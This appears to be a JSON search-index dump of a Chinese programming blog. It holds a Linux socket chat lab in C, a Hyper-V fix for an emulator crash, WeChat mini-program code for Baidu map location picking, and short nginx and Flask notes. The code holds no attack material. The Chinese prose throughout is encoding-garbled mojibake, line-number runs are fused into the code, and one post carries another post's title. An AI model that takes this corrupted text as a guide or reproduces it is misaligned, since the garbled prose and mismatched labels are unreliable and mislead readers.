[{"title":"Linux å®éªŒ socketç½‘ç»œç¼–ç¨‹","date":"2020-11-04T16:00:00.000Z","path":"2020/11/05/Note/Linuxå®éªŒsocketç½‘ç»œç¼–ç¨‹/","text":"Linux å®éªŒ socketç½‘ç»œç¼–ç¨‹è¦æ±‚ç¼–å†™ä¸¤ä¸ªç¨‹åºï¼Œä¸€ä¸ªServerï¼Œä¸€ä¸ªClientï¼Œåˆ†åˆ«è¿è¡Œåœ¨ä¸¤ä¸ªshellçª—å£ï¼Œé€šè¿‡Socketå®ç°ä¸¤ä¸ªShellçª—å£çš„å³æ—¶é€šä¿¡ ï¼ˆå³åœ¨Açª—å£è¾“å…¥Helloï¼ŒBçª—å£ä¼šç«‹å³æ˜¾ç¤ºâ€œClientï¼šHelloâ€ã€‚Bçª—å£ä¹Ÿå¯ä»¥è¾“å…¥ä»»æ„å†…å®¹ï¼Œæ¯”å¦‚â€œNice to meet youâ€ï¼Œåœ¨Açª—å£ç«‹å³æ˜¾ç¤ºâ€œServerï¼š Nice to meet youâ€ã€‚ï¼‰ï¼ˆæç¤ºï¼šæœ¬åœ°åœ°å€æ˜¯127.0.0.1ï¼Œç«¯å£æœ€å¥½10000ä»¥ä¸Šï¼Œé¿å…å æ®å…¶ä»–åº”ç”¨ç«¯å£ã€‚æ³¨æ„è®¿é—®æƒé™é—®é¢˜ã€‚ï¼‰ Server.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153#include &lt;stdio.h&gt;#include &lt;signal.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;netinet&#x2F;in.h&gt;#include &lt;arpa&#x2F;inet.h&gt;#include &lt;sys&#x2F;types.h&gt;#include &lt;sys&#x2F;socket.h&gt;#include &lt;sys&#x2F;wait.h&gt;#define PORT 23456#define SERVER_ADDR &quot;127.0.0.1&quot;int server_socket,client_socket;void func_kill(int sig)&#123; &#x2F;&#x2F; printf(&quot;%d &quot;,close(server_socket)); &#x2F;&#x2F; printf(&quot;%d &quot;,close(client_socket)); close(server_socket); close(client_socket); signal(SIGINT,SIG_DFL); exit(3);&#125;int main(int argc, char *argv[])&#123; &#x2F;&#x2F; ä¿©ä¸ªå­è¿›ç¨‹ pid1 ç”¨äºæ¥æ”¶ pid2 ç”¨äºå‘é€ int pid1,pid2; &#x2F;&#x2F; ç­‰å¾…pidé€€å‡ºä¿¡å· int pid_exit_status; &#x2F;&#x2F; ç»‘å®šç«¯å£ç»“æœ ç›‘å¬ç«¯å£ç»“æœ int Bind_res,Listen_res; &#x2F;&#x2F; å®¢æˆ·ç«¯åœ°å€å—å¤§å° socklen_t clientaddr_len; &#x2F;&#x2F; æœåŠ¡ç«¯åœ°å€å— å®¢æˆ·ç«¯åœ°å€å— struct sockaddr_in serveraddr,clientaddr; &#x2F;&#x2F; å­˜å‚¨æ¥å—çš„æ¶ˆæ¯ å‘é€çš„æ¶ˆæ¯ char recv_msg[100],send_msg[100]; &#x2F;&#x2F;åˆ›å»ºæœåŠ¡socket server_socket &#x3D; socket(AF_INET,SOCK_STREAM,0); if(server_socket&#x3D;&#x3D;-1) &#123; perror(&quot;The socket is error!\\n&quot;); exit(0); &#125; &#x2F;&#x2F; è®¾ç½®ç«¯å£ç»‘å®š,å–æ¶ˆTIME_WAIT,é¿å…å ç”¨ struct linger ling; ling.l_onoff &#x3D; 1; ling.l_linger &#x3D; 0; setsockopt(server_socket,SOL_SOCKET, SO_LINGER, &amp;ling, sizeof(ling)); &#x2F;&#x2F; è®¾ç½®æœåŠ¡ç«¯åœ°å€ serveraddr.sin_family &#x3D; AF_INET; &#x2F;&#x2F;ipv4 serveraddr.sin_port &#x3D; htons(PORT); &#x2F;&#x2F;ç«¯å£ inet_aton(SERVER_ADDR,&amp;serveraddr.sin_addr); &#x2F;&#x2F;åœ°å€ bzero(serveraddr.sin_zero,8); &#x2F;&#x2F;ç»‘å®š å’Œ ç›‘å¬ ç«¯å£ Bind_res &#x3D; bind(server_socket, (struct sockaddr *)(&amp;serveraddr),sizeof(serveraddr)); if(Bind_res&#x3D;&#x3D;-1) &#123; perror(&quot;The bind is error!\\n&quot;); exit(0); &#125; Listen_res &#x3D; listen(server_socket,2); if(Listen_res&#x3D;&#x3D;-1) &#123; perror(&quot;The listen is error!\\n&quot;); exit(0); &#125; printf(&quot;server start!\\n&quot;); &#x2F;&#x2F; æ•è· ctrl+cä¿¡å· signal(SIGINT,func_kill); &#x2F;&#x2F; å­è¿›ç¨‹pid1ç”¨äºå‘é€ pid1&#x3D; fork(); &#x2F;&#x2F; ç”¨äºä¸»è¿›ç¨‹é˜»å¡ while(1) &#123; if(pid1&#x3D;&#x3D;0) &#123; &#x2F;&#x2F;ç­‰å¾…è¿æ¥ clientaddr_len &#x3D; sizeof(struct sockaddr_in); memset(&amp;clientaddr, &#39;\\0&#39;, sizeof(struct sockaddr_in)); client_socket &#x3D; accept(server_socket, (struct sockaddr*)(&amp;clientaddr), &amp;clientaddr_len); if(client_socket &#x3D;&#x3D; -1) &#123; perror(&quot;The accept is error!\\n&quot;); exit(0); &#125; else &#123; &#x2F;&#x2F; æ‰“å°è¿æ¥çš„å­è¿›ç¨‹ipåœ°å€å’Œç«¯å£ä¿¡æ¯ char clntName[1024]; if (inet_ntop(AF_INET, &amp;clientaddr.sin_addr.s_addr, clntName, sizeof(clntName)) !&#x3D; NULL) &#123; printf(&quot;connecting client ip: %s port: %d\\n&quot;, clntName, ntohs(clientaddr.sin_port)); &#125; else &#123; printf(&quot;client address get failed\\n&quot;); &#125; &#125; printf(&quot;client connected success!\\n&quot;); &#x2F;&#x2F; pid2 ç”¨äºæ¥æ”¶ pid2&#x3D;fork(); if(pid2&#x3D;&#x3D;0) &#123; &#x2F;&#x2F; pid2 é˜»å¡ while (1) &#123; &#x2F;&#x2F; å½“å­è¿›ç¨‹pid1æ£€æµ‹åˆ°clientæ–­å¼€è¿æ¥å,åŠæ—¶é€€å‡ºå­è¿›ç¨‹pid2,å…³é—­socket signal(SIGHUP, func_kill); fgets(send_msg, sizeof(send_msg), stdin); send(client_socket, send_msg, sizeof(send_msg), 0); &#125; &#125;else&#123; &#x2F;&#x2F; pid1 é˜»å¡ while (1) &#123; int result &#x3D; recv(client_socket,recv_msg, sizeof(recv_msg), 0); &#x2F;&#x2F; å­è¿›ç¨‹pid1æ£€æµ‹åˆ°clientæ–­å¼€è¿æ¥ if (result &lt;&#x3D; 0) &#123; printf(&quot;client connect close\\n&quot;); close(client_socket); kill(pid2,SIGHUP); break; &#125; &#x2F;&#x2F; æ­£å¸¸è¿æ¥ printf(&quot;Client:%s&quot;,recv_msg); &#125; &#125; &#125; else &#123; &#x2F;&#x2F; é˜»å¡çˆ¶è¿›ç¨‹,pid1é€€å‡ºäº†å°±æŠŠçˆ¶è¿›ç¨‹ä¹Ÿé€€å‡º int exit_pid &#x3D; wait(&amp;pid_exit_status); if (exit_pid &#x3D;&#x3D; pid1) &#123; &#x2F;&#x2F; printf(&quot;paraent process quit!\\n&quot;); close(server_socket); close(client_socket); exit(0); &#125; &#125; &#125; return 0;&#125; Client.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116#include &lt;stdio.h&gt;#include &lt;signal.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;netinet&#x2F;in.h&gt;#include &lt;arpa&#x2F;inet.h&gt;#include &lt;sys&#x2F;socket.h&gt;#include &lt;sys&#x2F;types.h&gt;#include &lt;sys&#x2F;wait.h&gt;#define PORT 23456#define SERVER_ADDR &quot;127.0.0.1&quot;int server_socket,client_socket;void func_kill(int sig)&#123; close(server_socket); close(client_socket); signal(SIGINT,SIG_DFL); exit(3);&#125;int main(int argc, char *argv[])&#123; &#x2F;&#x2F; ä¿©ä¸ªå­è¿›ç¨‹ pid1 ç”¨äºæ¥æ”¶ pid2 ç”¨äºå‘é€ int pid1,pid2; &#x2F;&#x2F; ç­‰å¾…pidé€€å‡ºä¿¡å· int pid_exit_status; &#x2F;&#x2F; æœåŠ¡ç«¯åœ°å€ struct sockaddr_in serveraddr; char recv_msg[100],send_msg[100]; &#x2F;&#x2F;åˆ›å»ºsocket server_socket &#x3D; socket(AF_INET,SOCK_STREAM,0); if(server_socket&#x3D;&#x3D;-1) &#123; perror(&quot;The socket is error!\\n&quot;); exit(0); &#125; &#x2F;&#x2F; è®¾ç½®ç«¯å£ç»‘å®š,å–æ¶ˆTIME_WAIT,é¿å…å ç”¨ struct linger ling; ling.l_onoff &#x3D; 1; ling.l_linger &#x3D; 0; setsockopt(server_socket,SOL_SOCKET, SO_LINGER, &amp;ling, sizeof(ling)); &#x2F;&#x2F; è®¾ç½®æœåŠ¡ç«¯åœ°å€ serveraddr.sin_family &#x3D; AF_INET; serveraddr.sin_port &#x3D; htons(PORT); inet_aton(SERVER_ADDR,&amp;serveraddr.sin_addr); bzero(serveraddr.sin_zero,8); &#x2F;&#x2F;è¿æ¥socket client_socket &#x3D; connect(server_socket, (struct sockaddr *)(&amp;serveraddr),sizeof(serveraddr)); if(client_socket&#x3D;&#x3D;-1) &#123; perror(&quot;The connect is error!\\n&quot;); exit(0); &#125; printf(&quot;server connect successï¼\\n&quot;); &#x2F;&#x2F; æ•è· ctrl+cä¿¡å· signal(SIGINT,func_kill); &#x2F;&#x2F; å­è¿›ç¨‹pid1ç”¨äºå‘é€ pid1&#x3D;fork(); &#x2F;&#x2F; ä¸»è¿›ç¨‹é˜»å¡ while(1) &#123; if (pid1&#x3D;&#x3D;0) &#123; &#x2F;&#x2F; å­è¿›ç¨‹pid2 ç”¨äºå‘é€ pid2&#x3D;fork(); if(pid2&#x3D;&#x3D;0) &#123; &#x2F;&#x2F; pid2é˜»å¡ while (1) &#123; signal(SIGHUP,func_kill); fgets(send_msg,sizeof(send_msg),stdin); send(server_socket,send_msg,sizeof(send_msg),0); &#125; &#125; else &#123; &#x2F;&#x2F; pid1é˜»å¡ while (1) &#123; int result &#x3D; recv(server_socket,recv_msg,sizeof(recv_msg),0); if (result&lt;&#x3D;0) &#123; printf(&quot;server close\\n&quot;); close(server_socket); close(client_socket); &#x2F;&#x2F; ä¸æœåŠ¡å™¨æ–­å¼€è¿æ¥,é€šçŸ¥pid2é€€å‡º,å…³é—­socket kill(pid2,SIGHUP); exit(1); &#125; printf(&quot;Server:%s&quot;,recv_msg); &#125; &#125; &#125; else &#123; &#x2F;&#x2F; é˜»å¡çˆ¶è¿›ç¨‹,pid1é€€å‡ºäº†å°±æŠŠçˆ¶è¿›ç¨‹ä¹Ÿé€€å‡º int exit_pid &#x3D; wait(&amp;pid_exit_status); if (exit_pid&#x3D;&#x3D;pid1) &#123; &#x2F;&#x2F; printf(&quot;paraent process quit!\\n&quot;); close(server_socket); close(client_socket); exit(0); &#125; &#125; &#125; return 0;&#125; è¿è¡Œç»“æœ","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"Linux","slug":"Linux","permalink":"https://yanmymickey.github.io/tags/Linux/"},{"name":"socket","slug":"socket","permalink":"https://yanmymickey.github.io/tags/socket/"}]},{"title":"Linux å®éªŒ socketç½‘ç»œç¼–ç¨‹","date":"2020-11-04T16:00:00.000Z","path":"2020/11/05/Note/å¤œç¥å®‰å“æ¨¡æ‹Ÿå™¨æ‰“å¼€Windowsç»¿å±bug/","text":"å¤œç¥æ¨¡æ‹Ÿå™¨æ‰“å¼€åWindowsç»¿å±è¿™è´§æ²¡æœ‰åƒvmwareä¸€æ ·çš„å¼‚å¸¸å¤„ç†ï¼Œä½†æ˜¯å…¶æ¨¡æ‹Ÿå™¨è¿è¡Œç¯å¢ƒæ˜¯å’Œvmwareå·®ä¸å¤šçš„è™šæ‹Ÿæœº,å¦‚æœWindowså¼€äº†wsl,å°†ä¼šå’Œwslçš„hype-Vå†²çª,å¯¼è‡´ç³»ç»Ÿå´©æºƒã€‚ è§£å†³åŠæ³•ï¼š é€šè¿‡å‘½ä»¤å…³é—­Hyper-Vï¼ˆæ§åˆ¶é¢æ¿å…³é—­Hyper-Vèµ·ä¸åˆ°å†³å®šæ€§ä½œç”¨ï¼Œè¦å½»åº•å…³é—­Hyper-Vï¼‰ ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡ŒWindows Powershell (ç®¡ç†å‘˜)ï¼ˆWindowsé”®+Xï¼‰ è¿è¡Œä¸‹é¢å‘½ä»¤å¹¶é‡å¯ç”µè„‘ï¼š 12#å…³é—­hype-Vbcdedit &#x2F;set hypervisorlaunchtype off å†æ¬¡æ‰“å¼€æ¨¡æ‹Ÿå™¨å°±ä¸ä¼šç»¿å±äº†ã€‚","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"}]},{"title":"å¾®ä¿¡å°ç¨‹åºç™¾åº¦åœ°å›¾APIç§»åŠ¨é€‰ç‚¹","date":"2020-11-04T16:00:00.000Z","path":"2020/11/05/Note/å¾®ä¿¡å°ç¨‹åºç™¾åº¦åœ°å›¾apiç§»åŠ¨é€‰ç‚¹/","text":"å¾®ä¿¡å°ç¨‹åºç™¾åº¦åœ°å›¾APIç§»åŠ¨é€‰ç‚¹å› ä¸ºä¸šåŠ¡éœ€è¦ä½¿ç”¨ç™¾åº¦åœ°å›¾APIï¼Œå‚è€ƒä¸€ä½å¤§ä½¬ç¼–å†™è…¾è®¯APIçš„æ€è·¯å’Œæ–¹æ³•ï¼Œæ”¹é€ æˆç™¾åº¦åœ°å›¾APIç§»åŠ¨é€‰ç‚¹ã€‚ æ€è·¯ï¼šwxmlå‰ç«¯éƒ¨åˆ†å°±ä¸æ”¹äº†ï¼Œç”¨ç”¨å¤§ä½¬çš„ã€‚ å¾®ä¿¡åœ°å›¾APIè·å–å½“å‰ä½ç½®ç»çº¬åº¦ä¿¡æ¯-&gt;ç™¾åº¦åœ°å›¾APIé€†åœ°å€è§£ææ–¹æ³•,è·å–å½“å‰ä½ç½®åç§°,çœå¸‚åŒºç­‰ä¿¡æ¯-&gt;setData mapChangeå‡½æ•°ç›‘å¬åœ°å›¾ç§»åŠ¨-&gt;è®¾ç½®ä¸€ä¸ªå®šæ—¶å™¨è¾¾åˆ°è½®è¯¢çš„ç›®çš„ï¼Œè®¾ç½®isGetå‚æ•°åˆ¤æ–­onLoadä¸­çš„wx.getlocationæ˜¯å¦æ‰§è¡Œå®Œã€‚-&gt;nearby_searchä»¥å½“å‰çš„åœ°å€åç§°ä¸ºæœç´¢å…³é”®å­—,å¸¦ä¸Šç»çº¬åº¦è¿›è¡ŒPOIæ£€ç´¢è·å–é™„è¿‘åœ°å€åˆ—è¡¨ æ³¨æ„ï¼šé¡µé¢åˆå§‹åŒ–æ—¶ä¼šå› ä¸ºscaleæ”¹å˜è§¦å‘ä¸€æ¬¡mapChangeå‡½æ•°ï¼Œç”±äºJSå•çº¿ç¨‹çš„ç‰¹æ€§ï¼Œé¡µé¢åˆå§‹åŒ–ä¸pageåˆå§‹åŒ–æ—¶åŒæ—¶è¿›è¡Œçš„ï¼Œå¦‚æœå…ˆæ‰§è¡Œwx.getlocationé‚£æ²¡æœ‰é—®é¢˜ï¼Œæ‰§è¡Œå®Œç»™ç»çº¬åº¦èµ‹å€¼äº†ï¼ŒmapChangeå¯ä»¥æ­£å¸¸æ‰§è¡Œï¼Œå¦‚æœmapChangeå…ˆæ‰§è¡Œï¼Œé‚£ä¹ˆæ­¤æ—¶ç»çº¬åº¦æ²¡æœ‰åˆå§‹å€¼ä¸ºç©ºï¼ŒmapChangeè¿”å›çš„ç»çº¬åº¦ä¿¡æ¯ä¹Ÿä¸ºç©ºï¼Œå¯¼è‡´è·å–é™„è¿‘åœ°å€ä¿¡æ¯ä¹Ÿä¸ºç©ºã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨getLocationä¸­ä¹Ÿæ‰§è¡Œä¸€æ¬¡è·å–é™„è¿‘åœ°å€ä¿¡æ¯çš„å‡½æ•°ï¼Œä½†æ˜¯è¿™æ ·ä¼šå¤šè°ƒç”¨ä¸€æ¬¡APIï¼Œè°ƒç”¨APIè¿˜æ˜¯æŒºè€—æ—¶ã€‚ getsuggestæ ¹æ®ç”¨æˆ·åœ¨è¾“å…¥æ¡†è¾“å…¥çš„å…³é”®å­—è¿›è¡ŒPOIçƒ­è¯æ£€ç´¢ï¼Œæœç´¢å½“å‰åŸå¸‚çš„çƒ­è¯åˆ—è¡¨ã€‚ è¿™ä¸‰ä¸ªæ˜¯ä¸»è¦åŠŸèƒ½ï¼Œå…¶ä»–çš„å…³äºé€‰æ‹©çœå¸‚åŒºä¸‰çº§è”åŠ¨çš„éƒ¨åˆ†ï¼Œç”±äºç™¾åº¦åœ°å›¾APIæ²¡æœ‰æä¾›å®Œæ•´çš„çœå¸‚åŒºå¿åˆ—è¡¨ï¼ˆå¯èƒ½æœ‰æ˜¯æˆ‘æ²¡æ‰¾åˆ°ï¼‰ï¼Œæˆ‘ä¹Ÿæ‡’å¾—å°è£…äº†ï¼Œå°±é˜‰å‰²æ‰äº†ã€‚ ä»£ç è´´ä¸€ä¸‹å…³é”®çš„JSéƒ¨åˆ†çš„ä»£ç ï¼Œè¯¦ç»†ä»£ç æŸ¥çœ‹Githubï¼Œè®°å¾—åœ¨app.jså¡«å†™çš„ä½ çš„ç™¾åº¦åœ°å›¾è°ƒç”¨å¯†åŒ™ak 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284import bmap from &#39;..&#x2F;..&#x2F;utils&#x2F;bmap-wx&#39;;import &#39;..&#x2F;..&#x2F;utils&#x2F;util&#39;let app &#x3D; getApp();let BMap &#x3D; new bmap.BMapWX(&#123; ak: app.globalData.ak,&#125;);Page(&#123; data: &#123; addListShow: false, addressName: &#39;&#39;, currentRegion: &#123; province: &#39;é€‰æ‹©åŸå¸‚&#39;, city: &#39;é€‰æ‹©åŸå¸‚&#39;, district: &#39;é€‰æ‹©åŸå¸‚&#39;, &#125;, isGet: false, latitude: &#39;&#39;, longitude: &#39;&#39;, centerData: &#123;&#125;, nearList: [], selectedId: 0, &#125;, onLoad: function () &#123; let that &#x3D; this; let fail &#x3D; function (data) &#123; console.log(data) &#125;; let success &#x3D; function (data) &#123; &#x2F;&#x2F; console.log(data); let wxMarkerData &#x3D; data.wxMarkerData; that.setData(&#123; isGet: true, addressName: wxMarkerData[0].address, currentRegion: data.originalData.result.addressComponent, centerData: wxMarkerData, latitude: wxMarkerData[0].latitude, longitude: wxMarkerData[0].longitude &#125;); &#125; that.mapCtx &#x3D; wx.createMapContext(&#39;myMap&#39;) &#x2F;&#x2F;å¾®ä¿¡APIå®šä½,è·å–å½“å‰ä½ç½®ç»çº¬åº¦ wx.getLocation(&#123; type: &#39;wgs84&#39;, success(res) &#123; &#x2F;&#x2F;console.log(res) BMap.regeocoding(&#123; location: res.latitude + &#39;,&#39; + res.longitude, fail: fail, success: success, &#125;); &#125;, fail(err) &#123; &#x2F;&#x2F;console.log(err) wx.hideLoading(&#123;&#125;); wx.showToast(&#123; title: &#39;å®šä½å¤±è´¥&#39;, icon: &#39;none&#39;, duration: 1500 &#125;) setTimeout(function () &#123; wx.navigateBack(&#123; delta: 1 &#125;) &#125;, 1500) &#125; &#125;) &#125;, onReady: function () &#123; &#125;, &#x2F;&#x2F;ç›‘å¬æ‹–åŠ¨åœ°å›¾ï¼Œæ‹–åŠ¨ç»“æŸæ ¹æ®ä¸­å¿ƒç‚¹æ›´æ–°é¡µé¢ mapChange: function (e) &#123; let that &#x3D; this; let fail &#x3D; function (data) &#123; console.log(data) &#125;; let success &#x3D; function (data) &#123; let wxMarkerData &#x3D; data.wxMarkerData[0]; &#x2F;&#x2F; console.log(wxMarkerData); that.setData(&#123; addressName: wxMarkerData.address, currentRegion: data.originalData.result.addressComponent, &#125;); let location &#x3D; wxMarkerData.latitude + &#39;,&#39; + wxMarkerData.longitude; that.nearby_search(wxMarkerData.address, location); &#125;; &#x2F;&#x2F;&amp;&amp; (e.causedBy &#x3D;&#x3D; &#39;scale&#39; || e.causedBy &#x3D;&#x3D; &#39;drag&#39;) if (e.type &#x3D;&#x3D; &#39;end&#39; &amp;&amp; (e.causedBy &#x3D;&#x3D; &#39;scale&#39; || e.causedBy &#x3D;&#x3D; &#39;drag&#39;)) &#123; &#x2F;*ç”¨ä¸€ä¸ªè½®è¯¢åˆ¤æ–­getlocationæ˜¯å¦æ‰§è¡Œå®Œ, ä¿è¯å®šä½å®Œå†æ‰§è¡Œmapchange, ä¸»è¦æ˜¯è§£å†³mapç»„ä»¶åˆå§‹åŒ–æ—¶ä¼šå› ä¸ºscaleæ”¹å˜è§¦å‘ä¸€æ¬¡å½“å‰å‡½æ•° *&#x2F; let i &#x3D; setInterval(function () &#123; let &#123; isGet &#125; &#x3D; that.data; if (isGet) &#123; clearInterval(i); &#x2F;&#x2F;å…ˆè°ƒç”¨å¾®ä¿¡ç»„ä»¶è·å–åœ°å›¾ä¸­å¿ƒç‚¹ä½ç½®ç»çº¬åº¦ that.mapCtx.getCenterLocation(&#123; success: function (res) &#123; &#x2F;&#x2F; console.log(res) that.setData(&#123; nearList: [], latitude: res.latitude, longitude: res.longitude, &#125;); &#x2F;&#x2F;ç™¾åº¦é€†åœ°å€è§£æ,å°†ç»çº¬åº¦è½¬æ¢ä¸ºåœ°å€ä¿¡æ¯ BMap.regeocoding(&#123; location: res.latitude + &#39;,&#39; + res.longitude, fail: fail, success: success, &#125;); &#125; &#125;); &#125; &#125;, 500) &#125; &#125;, &#x2F;&#x2F;é‡æ–°å®šä½ reload: function () &#123; this.onLoad(); &#125;, onShow: function () &#123; &#125;, &#x2F;&#x2F; æ ¹æ®å…³é”®è¯æœç´¢é™„è¿‘ä½ç½® nearby_search: function (addressName, location) &#123; let that &#x3D; this; &#x2F;*å‘èµ·POIæ£€ç´¢è¯·æ±‚,æœç´¢å½“å‰ä½ç½®é™„è¿‘åœ°å€ä¿¡æ¯ å¦‚æœä¸çŸ¥é“å‚æ•°å¯ä»¥é€šè¿‡ctrl+é¼ æ ‡å·¦é”®è¿›å…¥ç±»å†…éƒ¨æŸ¥çœ‹æ–¹æ³• *&#x2F; BMap.search(&#123; &quot;query&quot;: addressName || &#39;æˆ¿åœ°äº§&#39;, location: location, page_size: 20, page_index: 1, success: function (res) &#123; &#x2F;&#x2F; console.log(res); let sug &#x3D; []; let wxMarkerData &#x3D; res.wxMarkerData; &#x2F;&#x2F; console.log(wxMarkerData) for (let i of wxMarkerData) &#123; &#x2F;&#x2F; console.log(i) sug.push(&#123; &#x2F;&#x2F; è·å–è¿”å›ç»“æœï¼Œæ”¾åˆ°sugæ•°ç»„ä¸­ title: i.title, id: i.id, addr: i.address, latitude: i.latitude, longitude: i.longitude &#125;); &#125; if (sug.length &gt; 0) &#123; that.setData(&#123; selectedId: 0, centerData: sug[0], nearList: sug, &#125;); &#125; &#125;, fail(err) &#123; console.log(err) wx.hideLoading(&#123;&#125;); wx.showToast(&#123; title: &#39;è·å–é™„è¿‘åœ°å€ä¿¡æ¯å¤±è´¥&#39;, icon: &#39;none&#39;, duration: 1500 &#125;) setTimeout(function () &#123; wx.navigateBack(&#123; delta: 1 &#125;) &#125;, 1500) &#125;, &#125;); &#125;, &#x2F;&#x2F;æ˜¾ç¤ºæœç´¢åˆ—è¡¨ showAddList: function () &#123; this.setData(&#123; addListShow: true &#125;) &#125;, &#x2F;&#x2F;æ ¹æ®å…³é”®è¯æœç´¢åŒ¹é…ä½ç½® getsuggest: function (ev) &#123; let that &#x3D; this; that.setData(&#123; addListShow: true &#125;) let keyWold &#x3D; ev.detail.value.trim(), &#123; currentRegion &#125; &#x3D; that.data, searchCity &#x3D; currentRegion.city; if (keyWold !&#x3D; &quot;&quot;) &#123; &#x2F;* æ ¹æ®è¾“å…¥çš„å…³é”®å­—,åœ¨å½“å‰åŸå¸‚æœç´¢å…³é”®å­—åœ°å€ä¿¡æ¯ *&#x2F; BMap.suggestion(&#123; query: keyWold, region: searchCity, &#x2F;&#x2F;å¸‚ city_limit: true, &#x2F;&#x2F; æœç´¢ç»“æœå¤„ç† success: res &#x3D;&gt; &#123; let newList &#x3D; res.result.filter(item &#x3D;&gt; &#123; return item.location; &#125;); &#x2F;&#x2F; console.log(newList) that.setData(&#123; nearList: newList, &#125;); &#125;, fail(err) &#123; console.log(err) &#125; &#125;); &#125; else &#123; if (!that.data.addListShow) &#123; that.setData(&#123; addListShow: true &#125;) &#125; &#125; &#125;, &#x2F;&#x2F;ç‚¹å‡»é€‰æ‹©åœ°å›¾ä¸‹æ–¹åˆ—è¡¨æŸé¡¹ chooseCenter: function (e) &#123; let that &#x3D; this; let id &#x3D; e.currentTarget.id; let nearList &#x3D; that.data.nearList; that.setData(&#123; selectedId: id, centerData: nearList[id], latitude: nearList[id].latitude, longitude: nearList[id].longitude, &#125;); &#125;, &#x2F;&#x2F;ç‚¹å‡»é€‰æ‹©æœç´¢ç»“æœ backfill: function (e) &#123; let that &#x3D; this; let id &#x3D; e.currentTarget.id; let nearList &#x3D; that.data.nearList; that.setData(&#123; selectedId: id, centerData: nearList[id], addListShow: false, latitude: nearList[id].latitude, longitude: nearList[id].longitude &#125;); &#x2F;&#x2F; é€‰æ‹©å®Œè¿”å›åœ°å›¾é¡µé¢ &#x2F;&#x2F; let location &#x3D; nearList[id].latitude + &#39;,&#39; + nearList[id].longitude; &#x2F;&#x2F; that.nearby_search(nearList[id].title, location); &#x2F;&#x2F; console.log(that.data.centerData) &#x2F;&#x2F;é€‰æ‹©å®Œè¿”å›ä¸Šä¸€é¡µ wx.navigateBack(&#123; delta: 1 &#125;) &#125;, &#x2F;&#x2F;è¿”å›ä¸Šä¸€é¡µæˆ–å…³é—­æœç´¢é¡µé¢ back1: function () &#123; wx.navigateBack(&#123; delta: 1 &#125;) &#x2F;&#x2F; if (this.data.addListShow) &#123; &#x2F;&#x2F; this.setData(&#123; &#x2F;&#x2F; addListShow: false &#x2F;&#x2F; &#125;) &#x2F;&#x2F; &#125; &#x2F;&#x2F;è¿”å›ä¸Šä¸€é¡µ &#x2F;&#x2F; else &#123; &#x2F;&#x2F; wx.navigateBack(&#123; &#x2F;&#x2F; delta: 1 &#x2F;&#x2F; &#125;) &#x2F;&#x2F; &#125; &#125;, &#x2F;&#x2F;ç¡®è®¤é€‰æ‹©åœ°å€ selectedOk: function () &#123; console.log(this.data.centerData) &#125;&#125;) Referenceå¾®ä¿¡å°ç¨‹åºâ€”â€”æ‰“å¼€åœ°å›¾ é€‰æ‹©ä½ç½® å®Œæ•´åŠŸèƒ½å®ç°ä»£ç (å®šä½ï¼Œæ£€ç´¢å‘¨è¾¹ï¼Œå¯ç§»åŠ¨é€‰ç‚¹ï¼Œå¯æœç´¢ï¼Œè…¾è®¯åœ°å›¾API) ä»£ç GitHubâ€”â€”å¾®ä¿¡å°ç¨‹åºç™¾åº¦åœ°å›¾APIç§»åŠ¨é€‰ç‚¹","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"wechatweb","slug":"wechatweb","permalink":"https://yanmymickey.github.io/tags/wechatweb/"}]},{"title":"é…ç½®æœ¬åœ°ç«™ç‚¹æ–¹æ³•","date":"2020-11-04T16:00:00.000Z","path":"2020/11/05/Note/é…ç½®æœ¬åœ°ç«™ç‚¹æ–¹æ³•/","text":"é…ç½®æœ¬åœ°ç«™ç‚¹æ–¹æ³•ç¬¬ä¸€æ­¥ä¿®æ”¹nginxé…ç½®æ–‡ä»¶,å¯ä»¥é€‰æ‹©å¤šç«¯å£å¤šç«™ç‚¹,æˆ–è€…80ç«¯å£å¤šç«™ç‚¹,ä¸€èˆ¬åªéœ€ä¿®æ”¹server_nameå’Œroot ç¬¬äºŒæ­¥åŒæ­¥hosts,åœ¨hostsæ–‡ä»¶é‡Œé¢æ·»åŠ æœ¬åœ°ç«™ç‚¹","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"}]},{"title":"flaskè‡ªå®šä¹‰æ—¥å¿—","date":"2020-08-05T16:00:00.000Z","path":"2020/08/06/Note/flaskè‡ªå®šä¹‰æ—¥å¿—/","text":"flaskè‡ªå®šä¹‰æ—¥å¿—loggeré¦–å…ˆæˆ‘ä»¬è¦äº†è§£pythonå®ç°è®°å½•ç¨‹åºæ—¥å¿—åŠŸèƒ½å¯ä»¥ä½¿ç”¨loggingæ¨¡å—ï¼Œå…³äºloggingçš„ç”¨æ³•ï¼Œç»§æ‰¿ç±»è‡ªå®šä¹‰æ—¥å¿—ï¼Œæ—¥å¿—ç­‰çº§ï¼Œç­‰ç­‰ã€‚ æ—¥å¿—è¾“å‡ºåˆ°æ–‡ä»¶ï¼Œç”¨FileHandlerï¼ŒRotatingFileHandler app.loggerçœ‹çœ‹app.loggeræºç  å¾—åˆ°å‡ ç‚¹ä¿¡æ¯ 